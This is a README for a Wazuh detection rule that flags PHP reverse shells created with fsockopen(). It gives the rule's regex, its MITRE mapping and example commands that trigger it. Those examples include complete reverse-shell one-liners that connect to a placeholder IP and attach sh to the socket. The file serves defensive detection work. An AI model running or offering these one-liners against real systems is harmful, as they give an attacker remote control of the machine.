# 🛡️ Wazuh Rule – PHP Reverse Shell via fsockopen()

## Rule ID
**100103**

## Severity
**Level 15 (High / Critical)**

---

## 📖 Overview

This Wazuh rule detects **potential reverse shell activity executed via PHP**, specifically leveraging the `fsockopen()` function from the command line.

Attackers frequently abuse PHP’s ability to open raw network sockets to establish **interactive reverse shells** or command-and-control channels, especially on systems where PHP CLI is available by default.

---

## 🔍 What This Rule Detects

The rule triggers when **all of the following conditions** are met:

1. PHP is executed in **command-line mode** using `php -r`
2. Inline PHP code is provided via quotes (`'` or `"`)
3. The PHP code contains a call to `fsockopen()`
4. `fsockopen()` is used with an **IPv4 address** and a **port**

This pattern strongly indicates **manual socket creation**, which is rarely legitimate in administrative workflows.

---

## 🧪 Example Commands That Trigger the Rule

```bash
php -r '$s=fsockopen("10.10.10.10",9001);'
php -r "fsockopen('192.168.1.5',4444);"
php -r '$sock = fsockopen("8.8.8.8",1337);'
php -r '$sock=fsockopen("10.10.10.10",9001);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
php -r '$sock=fsockopen("10.10.10.10",9001);passthru("sh <&3 >&3 2>&3");'
```

---

## ❌ Examples That Do NOT Trigger the Rule

```bash
php script.php
php -i
php -r 'echo "hello world";'
php -r '$a=1+1;'
```

---

## 🧠 Detection Logic

```regex
php\s+-r\s+['"].*fsockopen\(\s*['"](?:\d{1,3}\.){3}\d{1,3}['"]\s*,\s*\d{1,5}\s*\)
```

---

## 🎯 MITRE ATT&CK Mapping

| Technique ID | Name |
|-------------|------|
| **T1059.004** | Command and Scripting Interpreter: Unix Shell |
| **T1059.006** | Command and Scripting Interpreter: PHP |
| **T1219** | Remote Access Software |
| **T1105** | Ingress Tool Transfer |

---

## 📍 Log Source Expectations

Example log file (testing only):

```
/var/log/cmdline
```

---

## 📌 Summary

> **This rule provides high-confidence detection of PHP-based reverse shells by identifying inline PHP execution that creates raw network sockets using `fsockopen()`.**
